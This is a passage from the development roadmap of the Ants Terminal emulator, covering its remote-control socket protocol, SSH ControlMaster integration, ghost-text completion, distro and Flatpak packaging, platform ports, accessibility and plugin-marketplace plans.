  - ✅ **Main-thread stall detector** (`DebugLog::Perf`, enabled
    via `ANTS_DEBUG=perf`). 200 ms heartbeat `QTimer` that
    records every drift > 100 ms as a main-thread stall. Added
    after the follow-up user report 2026-04-20: "slow down
    experienced at various times, when tab has been clear or
    has had lots of text, not one specific scenario." The
    intermittent-and-content-independent signature points away
    from the PTY hot path and toward a periodic background
    handler (2 s status-bar `updateStatusBar` reading
    `.git/HEAD`, 2 s Claude-integration `/proc` walk, focus-
    redirect lambda, plugin callback, session save, file-system
    watcher fire). The detector fingerprints which one on the
    next reproduction — log line shape is `STALL: main-thread
    blocked for Nms (gap=..., interval=..., count=..., worst=...)`.
  Kind: refactor.

### 🎨 Features — multiplexing

- 🚧 [ANTS-1063] **Remote-control protocol** (Kitty-style,
  [docs](https://sw.kovidgoyal.net/kitty/rc_protocol/)): JSON envelopes
  over a Unix socket. Commands: `launch`, `send-text`, `set-title`,
  `select-window`, `get-text`, `ls`, `new-tab`. Auth via X25519 when
  a password is set. Unlocks scripting, IDE integration, CI.
  - ✅ **First slice: socket + envelope + `ls`.** `src/remotecontrol.{h,cpp}`
    brings up a `QLocalServer` on `$ANTS_REMOTE_SOCKET` (or the XDG
    runtime default `$XDG_RUNTIME_DIR/ants-terminal.sock`). Each
    connection is one-shot: read a single JSON line, dispatch, write
    the JSON response line, close. `ls` returns
    `{"ok": true, "tabs": [{"index", "title", "cwd", "active"}, ...]}`.
    Unknown commands return `{"ok": false, "error": "unknown command: ..."}`
    with exit code 2. The same binary handles client mode via
    `--remote <cmd>` (optionally `--remote-socket <path>`) — no
    separate client binary. Pinned by source-grep feature test
    `tests/features/remote_control_ls/` (8 invariants including
    field-name stability, env-var override, `--remote` ordering).
  - ✅ **`send-text` command.** Writes a UTF-8 string byte-for-byte to
    a tab's PTY master. `tab` field optional (active tab default),
    `text` required; response carries `bytes` written. Client CLI:
    `--remote-text <str>` or stdin pipe; `--remote-tab <i>` optional.
    Does not auto-append a newline (matches Kitty; callers include
    terminators explicitly). Pinned by
    `tests/features/remote_control_send_text/`.
  - ✅ **`new-tab` command.** Opens a fresh tab and returns its
    0-based index. `cwd` optional (inherits focused-terminal cwd);
    `command` optional (written via `writeCommand` after a 200 ms
    settle). Response: `{"ok":true,"index":<int>}`. Client CLI:
    `--remote-cwd <path>`, `--remote-command <str>`. Pinned by
    `tests/features/remote_control_new_tab/`.
  - ✅ **`select-window` command.** Switches the active tab to the
    0-based index given in the `tab` field (required). Focuses the
    new tab's terminal so follow-up `send-text` without an explicit
    tab lands correctly. Pinned by
    `tests/features/remote_control_select_window/`.
  - ✅ **`set-title` command.** Pins a tab label that survives both
    the per-shell `titleChanged` signal (OSC 0/2) and the 2 s
    `updateTabTitles` refresh. Empty title clears the pin and
    restores from `shellTitle()` (under `tabTitleFormat == "title"`)
    or rebuilds via the format-driven path. Pin freed at tab-close.
    Pinned by `tests/features/remote_control_set_title/`.
  - ✅ **`get-text` command.** Returns trailing N lines of
    (scrollback + screen) joined with `\n`. Default 100, capped
    server-side at 10 000 to bound the JSON envelope. Reuses
    `TerminalWidget::recentOutput()` — same accessor the AI dialog
    uses for context capture, so format stays consistent. Pinned
    by `tests/features/remote_control_get_text/`.
  - ✅ **`launch` command.** Convenience wrapper for `new-tab` +
    `send-text`, sugar for `idx=$(... new-tab) && ... send-text
    --remote-tab $idx ...`. `command` is required (rejects empty
    with a "use new-tab" hint); auto-appends `\n` so the command
    actually runs. Pinned by `tests/features/remote_control_launch/`.
    **Initial command surface complete** — 7/7. Remaining work in
    this item is the X25519 auth layer (currently 💭).
  - 💭 [ANTS-1064] **Auth layer.** X25519 shared-secret when `$ANTS_REMOTE_PASSWORD`
    is set. Shipped after the command surface is complete.
  Kind: implement.
  Source: planned.
- 📋 [ANTS-1065] **Headless mux server with codec RPC**. WezTerm's architecture
  ([DeepWiki](https://deepwiki.com/wezterm/wezterm/2.2-multiplexer-architecture)):
  `ants-terminal --server` runs without a GUI and accepts attachments
  over a Unix socket; `ants-terminal --attach <socket>` reconnects.
  Panes survive window close. Sparse scrollback fetched on demand via
  `GetLines` RPC.
  Kind: implement. Source: prior-art-WezTerm.
- ✅ **SSH ControlMaster** auto-integration from the SSH bookmark
  dialog. Shipped in 0.7.1. Connects opened from the SSH Manager
  carry `-o ControlMaster=auto`,
  `-o ControlPath=$HOME/.ssh/cm-%r@%h:%p`, and
  `-o ControlPersist=10m` when the new `ssh_control_master` config
  key is true (default). `$HOME` resolves in-process via
  `QDir::homePath()` so the ControlPath works under dash / POSIX
  `sh`; `%r@%h:%p` are OpenSSH tokens and survive shell quoting
  intact. Second tab to the same host opens in ms instead of
  seconds. See
  [CHANGELOG.md §0.7.1](CHANGELOG.md#071--2026-04-19).
  Kind: implement.
- 💭 [ANTS-1066] **Domain abstraction** à la WezTerm: `DockerDomain` lists
  `docker ps`, opens a tab via `docker exec -it`; `KubeDomain` lists
  pods, opens via `kubectl exec`. Reuses the SSH bookmark UI shell.
  Kind: implement.
  Source: planned.
- 💭 [ANTS-1067] **Persistent workspaces**: save/restore entire tab+split layout +
  scrollback to disk; one-click "resume yesterday's dev session."
  Kind: implement.
  Source: planned.

### 🎨 Features — inline ghost-text completion

Claude Code's "as-you-type" completion pattern — you begin typing a
command (e.g. `/ind`), the rest of the best match (`ie-review`) is
shown inline in a dim/greyed color, and TAB commits it. This is
separate from a popup/dropdown picker — it's inline with the cursor,
zero-click, purely suggestive. Proposed in two scopes:

- ✅ **Command Palette ghost-completion (near-term, small scope).**
  Shipped 0.7.42. New `GhostLineEdit` subclass of `QLineEdit`
  (declared in `src/commandpalette.h`) overrides `paintEvent` to
  draw the unmatched suffix of the top fuzzy-match at
  `cursorRect().right() + 1` in `palette().color(QPalette::Text)`
  with `setAlphaF(0.45)` — matches the design contract
  `palette[fg] * 0.45 alpha` exactly. `populateList` calls a new
  `updateGhostCompletion(filter)` that picks the top item, recovers
  the underlying `QAction`, and (only for case-insensitive prefix
  matches) sets the ghost to `name.mid(filter.length())`.
  `contains()`-only matches get an empty ghost since the suffix
  visual contract only makes sense flush after the user's input.
  `Tab` is wired to `commitGhost()`, which appends the ghost to the
  input via `setText`; the post-commit text equals the visible
  composition (user-typed prefix + ghost suffix), preserving
  user-typed casing on commit (shell-completion semantics). `Tab`
  does not also execute — `Enter` runs, matching Claude Code's
  `/slash`-completion contract. Tab is always consumed by the
  palette so focus cannot leave the input while it is open. Locked
  by `tests/features/command_palette_ghost_completion/` (ten
  invariants); pre-fix verification: with `commandpalette.{h,cpp}`
  stashed, the test fails to even compile (missing `GhostLineEdit`
  symbol). The in-terminal shell ghost-suggestion (`💭` below)
  remains separate scope — different surface, different data
  source.
- 💭 [ANTS-1068] **In-terminal shell ghost-suggestion (fish-shell style, bigger
  scope).** As the user types at the shell prompt, ghost-suggest
  from shell history — fish's killer UX feature. Requires two
  pieces: (a) prompt detection (OSC 133 already provides this —
  `A`/`B`/`C` markers bracket the command line), (b) a history
  source. Two options:
    - *Zero-shell-integration*: scrape `$HISTFILE` via inotify on
      `~/.bash_history` / `~/.zsh_history` / `~/.local/share/fish/fish_history`.
      Cross-shell, no user setup, but lags (history flushes on shell
      exit for bash/zsh).
    - *OSC-bridged*: introduce a new OSC payload
      (`OSC 133 ; D ; <command> ST` or similar) emitted by a shell
      plugin (shipped alongside Ants for bash/zsh/fish). Near-realtime,
      but requires shell-side setup.
  Render the ghost suggestion inline (rightward from the cursor) by
  injecting it into the terminal's own cursor-row painting — gated
  on OSC 133 A (we know we're on a prompt line), cleared on A again
  or on PTY output (user's shell re-printing over it).
  Non-trivial — touches `terminalgrid.cpp` paint path, `vtparser.cpp`
  (new OSC dispatch if shell plugin ships), new config keys
  (`ghost_completion_enabled`, `ghost_completion_source`). Defer to
  beyond 1.0 unless users ask.
  Kind: implement.
  Source: planned.
- 💭 [ANTS-1069] **Frequency-ranked completion source.** Either form benefits
  from "show the most-used match first, not just the alphabetically-
  first match." The Command Palette could track selection counts;
  the terminal form can lean on shell history ordering. Worth a
  mention but not a blocker for the initial implementation.
  Kind: implement.
  Source: planned.

### 📦 Distribution readiness (H5–H7, H13)

Mid-term packaging work — this is where Ants moves from
"packageable-in-theory" to "actually installable on every major
distro." Each sub-bullet can ship independently once H1–H4 land.

- ✅ **H5 — ready-to-submit distro packaging files**. Shipped in
  0.6.20. Each recipe drives the existing CMake install rules with
  zero source patches and runs the audit-rule regression suite in
  its own test stage:
  - `packaging/opensuse/ants-terminal.spec` — openSUSE RPM spec
    targeting Tumbleweed. Uses core macros (`%cmake`,
    `%cmake_build`, `%cmake_install`, `%ctest`, `%autosetup`) so
    the file is close to portable to Fedora. BuildRequires
    declared via `cmake(Qt6*)` pkgconfig-style entries; `%files`
    enumerates all fifteen install paths explicitly so a missing
    artefact fails the OBS build instead of producing a
    silently-incomplete package. Submit via OBS to
    `devel:languages:misc` or a dedicated project; changelog lives
    in a separate `.changes` file per openSUSE convention.
  - `packaging/archlinux/PKGBUILD` — Arch AUR release recipe
    (`ants-terminal`). `check()` runs ctest; built against system
    Qt6 and lua. `sha256sums=('SKIP')` in-tree with a comment
    pointing packagers at `updpkgsums` once the upstream tag is
    live. The `-git` rolling variant is documented in
    `packaging/README.md` (three-line diff: `pkgname`, `source`,
    `pkgver()`).
  - `packaging/debian/` — `control`, `rules`, `changelog`,
    `copyright`, `source/format`. `debhelper-compat 13` drives
    `dh $@ --buildsystem=cmake` with Ninja as the backend; DEP-5
    `copyright` carries the full MIT license text;
    `DEB_BUILD_MAINT_OPTIONS = hardening=+all` stacks
    dpkg-buildflags' hardening wrappers on top of our CMake
    hardening flags. Suitable for `debuild -uc -us` or a Launchpad
    PPA; eventual target is ITP → official archive.
  - `packaging/README.md` — one-page build / submission guide for
    all three recipes.

  See [CHANGELOG.md §0.6.20](CHANGELOG.md#0620--2026-04-15).
- ✅ **H6 — Flatpak packaging**. Shipped in 0.7.2.
  `packaging/flatpak/org.ants.Terminal.yml` against
  `org.kde.Platform//6.7` (KDE SDK brings cmake/ninja/Qt6). The PTY
  path in `src/ptyhandler.cpp` detects `FLATPAK_ID` /
  `/.flatpak-info` in the forked child and exec's the user's shell
  via `flatpak-spawn --host` with explicit
  `--env=TERM/COLORTERM/TERM_PROGRAM/TERM_PROGRAM_VERSION/COLORFGBG`
  and `--directory=<workDir>` — the only workable PTY model inside a
  sandbox (same pattern Ghostty's Flathub build uses). `finish-args`
  cover Wayland/X11/DRI, network (AI endpoint + SSH), portals
  (global shortcuts), desktop notifications, and XDG config/data
  directories. Source-grep feature test
  (`tests/features/flatpak_host_shell/`) pins the branch shape:
  detection probes both signals in an OR, `--host` + `--`
  separators, every TERM var passes through as `--env=`, workDir
  gates on `isEmpty()`, direct-exec fallback is preserved verbatim.
  Lua plugins disabled in the initial manifest — `org.kde.Sdk`
  doesn't ship lua54 and tarball-sha256 refresh per release is a
  maintenance cost worth deferring; plugin support returns via a
  `shared-modules` Lua entry in a follow-up (H6.1 below). Flathub
  submission is the final step — manifest is ready to re-point
  `sources[].type: dir` → `git / url / tag` and PR against
  [flathub/flathub](https://github.com/flathub/flathub) (H6.2
  below). See [CHANGELOG.md §0.7.2](CHANGELOG.md#072--2026-04-19)
  and [packaging/flatpak/README.md](packaging/flatpak/README.md).
- ✅ **H6.1 — Lua plugins in Flatpak**. Shipped in 0.7.3. The
  manifest now carries an in-manifest Lua 5.4 `archive` module
  before `ants-terminal`, built from
  `https://www.lua.org/ftp/lua-5.4.7.tar.gz` with a pinned
  `sha256` and the `linux-noreadline` target (Ants only links
  `liblua.a` statically; readline would be bloat in the sandbox).
  `MYCFLAGS="-fPIC"` keeps the library PIE-safe for linking into
  the `ants-terminal` executable; installed to `/app` via
  `make install INSTALL_TOP=/app`, where CMake's `FindLua`
  searches by default. The `x-checker-data` stanza on the module
  is wired to
  [flatpak-external-data-checker](https://github.com/flathub/flatpak-external-data-checker)
  so Flathub CI auto-refreshes the `url` + `sha256` on each Lua
  5.4.x point release — no manual hash churn, and 5.5.x majors
  are excluded (they would break the in-source
  `find_package(Lua 5.4)` floor). `tests/features/flatpak_lua_module/`
  pins six invariants against the manifest YAML (module order,
  pinned sha256, `-fPIC`, install prefix, readline-free target,
  x-checker-data stanza). The `flathub/shared-modules` path
  remains the cleaner long-term home if Flathub ever accepts a
  Lua 5.4 entry — migration would replace the in-manifest module
  with a shared-modules reference; `x-checker-data` would
  continue to fire. See
  [CHANGELOG.md §0.7.3](CHANGELOG.md#073--2026-04-20).
- 📋 [ANTS-1070] **H6.2 — Flathub submission**. PR a new repo against
  [flathub/flathub](https://github.com/flathub/flathub) named
  `org.ants.Terminal`. In-tree prep is complete: the
  `<screenshots>` block in
  `packaging/linux/org.ants.Terminal.metainfo.xml` now points at three
  captures under `docs/screenshots/` so Flathub's store tile renders
  with real UI (main terminal + Review Changes dialog + Project Audit
  panel), and `packaging/flatpak/make-flathub-manifest.sh` + a feature
  test pin the transformation from the dev manifest
  (`type: dir / path: ../..`) to the Flathub manifest
  (`type: git / url: https://github.com/milnet01/ants-terminal /
  tag: v<version>`) so there is one source of truth for the manifest.
  Submission playbook lives at
  [packaging/flatpak/FLATHUB.md](packaging/flatpak/FLATHUB.md).
  Remaining blocker is real-user shakedown of the v0.7.3 Flatpak —
  wait for a small cohort to exercise the host-shell + plugin build
  before claiming the Flathub repo name. Once the PR merges, Flathub
  CI rebuilds on each new `v<version>` tag — no manual work per
  release, only per-bump regeneration of the tag-pinned manifest
  (one script invocation). On landing, flip the "gating item 1: no
  distro packages anywhere" entry in the
  [Distribution-adoption overview](#distribution-adoption-overview)
  from "H5 + H6 unblock this" to "unblocked".
  Kind: chore.
  Source: planned.
- 📋 [ANTS-1071] **H7 — project website + docs site**. Static GitHub Pages site
  at `ants-terminal.github.io` (or equivalent) with: screenshots,
  installation instructions (once H5/H6 land), plugin authoring
  guide (move `PLUGINS.md` body here, keep the file as a pointer),
  quickstart, architecture overview, video/asciicast demos.
  Content-as-code (markdown → static site generator) so the docs
  ship from the same repo.
  Kind: chore.
  Source: planned.
- 📋 [ANTS-1072] **H13 — distro-outreach launch**. Once H1–H7 are shipped:
  file **intent-to-package** bugs / RFPs in Debian / Fedora /
  NixOS / openSUSE / Arch (as applicable); write a
  **"Why Ants Terminal"** post for r/linux, Hacker News, Phoronix
  tip line, LWN. Focus angle: **the only Linux terminal with a
  built-in capability-audited Lua plugin system + AI triage +
  first-class shell-integration blocks**. Measure via watching
  the GitHub stars + install metrics, not vanity.
  Kind: chore.
  Source: planned.

### 🔌 Plugins — marketplace

- 📋 [ANTS-1073] **Signed plugin packaging**: Ed25519 sig over a tarball containing
  `init.lua`, `manifest.json`, and optional assets. Loader verifies
  against a project-maintained keyring + (optionally) user-added keys.
  Kind: implement.
  Source: planned.
- 📋 [ANTS-1074] **Public marketplace index**: static JSON hosted on GitHub Pages
  listing name, version, author, signature-status, permission summary.
  Settings → Plugins → Browse lists them with an install button.
  Kind: implement.
  Source: planned.
- 📋 [ANTS-1075] **Plugin dependency resolution**: `manifest.json` `requires: [...]`
  field; install flow resolves transitively.
  Kind: implement.
  Source: planned.

### 🖥 Platform

(See the 📦 Distribution readiness section above for the Flatpak +
source-package packaging work; items that don't fit there live
here.)

---

## 0.9.0 — platform + a11y (target: 2026-10)

**Theme:** reach new users. Port, accessibility, internationalization.

### 🖥 Platform

- 📋 [ANTS-1076] **H8 — macOS port**. Qt6 ports cleanly; replace `forkpty` with
  `posix_spawn` + `openpty`, swap `xcbpositiontracker` for
  `NSWindow` KVO observers, sign+notarize the `.app`. Expands the
  addressable audience — a terminal that only runs on Linux is not
  a "Linux terminal project", it's a "Linux-only terminal" —
  distinction matters for cross-platform press coverage.
  Kind: implement.
  Source: planned.
- 💭 [ANTS-1077] **H12 — Windows port**. ConPTY via `CreatePseudoConsole`
  replaces PTY; `xcbpositiontracker` becomes a no-op. Qt6's
  Windows platform plugin handles the rest. Sign + ship MSI /
  MSIX. Moved to Beyond 1.0 in practice — gating on macOS port
  completing first.
  Kind: implement.
  Source: planned.

### 🖥 Accessibility

- 📋 [ANTS-1078] **H9 — AT-SPI/ATK support**. Qt6 has AT-SPI over D-Bus natively.
  Work: implement `QAccessibleInterface` for `TerminalWidget`
  exposing role `Terminal`; fire `text-changed` / `text-inserted`
  on grid mutations (gate on OSC 133 `D` markers to batch); expose
  cursor as caret
  ([freedesktop AT-SPI2](https://www.freedesktop.org/wiki/Accessibility/AT-SPI2/)).
  Without this, Orca reads nothing in the terminal. Ubuntu /
  Fedora accessibility review gates on this.
  Kind: implement.
  Source: planned.
- 💭 [ANTS-1079] **Screen-magnifier-friendly rendering**: honor
  `QGuiApplication::styleHints()->mousePressAndHoldInterval()` and
  provide high-contrast theme variants.
  Kind: implement.
  Source: planned.

### 🌍 Internationalization

- 📋 [ANTS-1080] **H10 — i18n scaffolding**. Qt's `lupdate` / `linguist` flow;
  wrap all UI strings with `tr()`; ship `.qm` files in
  `assets/i18n/`. Today we have zero `tr()` usage. Start with
  English → Spanish, French, German as a proof of concept. Some
  distros gate review on this.
  Kind: implement.
  Source: planned.
- 💭 [ANTS-1081] **Right-to-left text support** — bidirectional text in the grid.
  Non-trivial; defer until demand is concrete.
  Kind: implement.
  Source: planned.

### 📦 Distribution readiness (H11)

- 💭 [ANTS-1082] **H11 — reproducible builds + SBOM**. Build under
  `SOURCE_DATE_EPOCH` so binary hashes are deterministic; generate
  an SPDX SBOM (`spdx-tools` or `syft`) alongside release
  artifacts. Reproducibility is a distro / supply-chain trust
  signal; the SBOM gives downstream security teams (Debian,
  NixOS) a machine-readable dep inventory without having to scrape
  our build system.
  Kind: chore.
  Source: planned.

### 🧰 Dev experience

- 📋 [ANTS-1083] **Plugin development SDK**: `ants-terminal --plugin-test <dir>`
  runs a plugin against a mock PTY with scripted events. Enables
  unit-testing plugins.
  Kind: implement.
  Source: planned.

---

## 1.0.0 — stability milestone (target: 2026-12)

**Theme:** API freeze. No new features; quality, docs, migration guide.

- 📋 [ANTS-1084] **`ants.*` API stability pledge**: the 1.0 surface won't break in
  `1.x` minor releases. Breaking changes queue for 2.0.
  Kind: implement.
  Source: planned.
- 📋 [ANTS-1085] **Performance regression suite**: CI benchmarks (grid throughput,
  scrollback allocation, paint-loop time) with commit-level deltas.
  Kind: implement.
  Source: regression.
- 📋 [ANTS-1086] **Documentation pass**: every user-facing feature has at least one
  screenshot + one animated demo. Rolls up into H7 (docs site).
  Kind: implement.
  Source: planned.
- 📋 [ANTS-1087] **External security audit**. `SECURITY.md` disclosure policy
  itself ships early under H1 (0.7.0); the 1.0 item is the
  **external** audit — budget a third-party review of the VT
  parser, plugin sandbox, and OSC-8/OSC-52 surfaces before
  stamping 1.0.
  Kind: implement.
  Source: planned.
- 📋 [ANTS-1088] **H14 — bus factor ≥ 2 + governance doc**. Second maintainer
  with commit rights; a short `GOVERNANCE.md` describing
  decision-making, release process, conflict resolution. Distros
  treat single-maintainer projects as a risk — a documented
  second maintainer clears the bar.
  Kind: implement.
  Source: planned.
- 📋 [ANTS-1089] **Plugin migration guide** for any manifest/API changes between
  0.9 and 1.0.
  Kind: implement.
  Source: planned.

## Beyond 1.0 — long-horizon

These are far enough out that specifics will change. Captured here so
contributors don't duplicate research.

### 🔌 Plugins

- 💭 [ANTS-1090] **WebAssembly plugins** via `wasmtime` or `wasmer`. Same `ants.*`
  API exposed as WASI imports. Lua plugins continue to work — WASM is
  additive for authors who want Rust/Go/AssemblyScript. Stronger
  sandbox than Lua's removed-globals model; language-agnostic. Ghostty
  is experimenting with a WASM-targeting VT library today.
  Kind: implement.
  Source: planned.
- 💭 [ANTS-1091] **Inter-plugin pub/sub**: `ants.bus.publish(topic, data)` /
  `ants.bus.subscribe(topic, handler)`. Needs careful permission
  modeling — a "read_bus: <topic>" capability.
  Kind: implement.
  Source: planned.

### 🎨 Features

- 💭 [ANTS-1092] **AI command composer** (Warp-style). Dialog over the prompt
  accepts natural language, returns a shell command + explanation.
  Uses the existing OpenAI-compatible config; opt-in per invocation.
  Kind: implement.
  Source: planned.
- 💭 [ANTS-1093] **Collaborative sessions**: real-time shared terminal with a
  second user via an end-to-end encrypted relay. The "share
  terminal with a colleague" feature tmate popularized.
  Kind: implement.
  Source: planned.
- 💭 [ANTS-1094] **Workspace sync**: mirror `config.json`, plugins, and SSH
  bookmarks across devices via a user-configurable git remote.
  Kind: implement.
  Source: planned.

### 🔒 Security

- 💭 [ANTS-1095] **Confidential computing**: run the PTY in an SGX/SEV enclave,
  with the renderer as the untrusted host. Meaningful for people who
  type secrets into the terminal — every keystroke lives only in
  enclave memory until it's shown on-screen. Heavy lift; benefit
  concentrated in a small user set.
  Kind: fix.
  Source: planned.

### ⚡ Performance

- 💭 [ANTS-1096] **GPU text rendering with ligatures**. Today GPU path can't
  render ligatures (HarfBuzz shaping is on the CPU path). Port the
  shaping step to a compute shader; keep the atlas path we already
  have.
  Kind: refactor.
  Source: planned.

### 📦 Distribution & community (H15–H16)

- 💭 [ANTS-1097] **H15 — conference presence**. FOSDEM lightning talk or a
  devroom slot (the Linux desktop devroom is where distro
  maintainers converge). Other options: LinuxFest Northwest,
  Everything Open, SCaLE. One talk reaches more maintainers than
  a hundred issues. Submit in the CFP window for whatever
  conference the project is scope-ready for at the time.
  Kind: chore.
  Source: planned.
- 💭 [ANTS-1098] **H16 — sponsorship / funding model**. GitHub Sponsors + Open
  Collective. Even small recurring funding signals project
  longevity to distro security teams (they care about "who pays
  for the 30-day CVE response?"). Tiered: individual ($5/mo),
  plugin-author ($20/mo with logo on docs site), corporate
  ($250/mo with logo + priority issue triage).
  Kind: chore.
  Source: planned.

## How to propose a roadmap item

Open a GitHub issue with:

1. **What**: one-sentence description of the capability or change.
2. **Why**: concrete user problem it addresses. Link to the source
   (forum post, issue, personal story) if possible.
3. **Prior art**: has another terminal solved this? Which one, how?
   Link the source.
4. **Scope hint**: is this a weekend change, a week, or a month?
5. **Category**: which theme (🎨/⚡/🔌/🖥/🔒/🧰/📦) does it belong to?

Items that fit naturally into the current release arc land in that
release. Items that don't get queued here with a 💭 marker until
the scope clarifies.

**A roadmap item is not a commitment.** It's a record that we thought
about it, found the prior art, and believe it fits the product. Scope
changes with bandwidth and real-world feedback. Check the
[CHANGELOG.md](CHANGELOG.md) for what actually shipped.
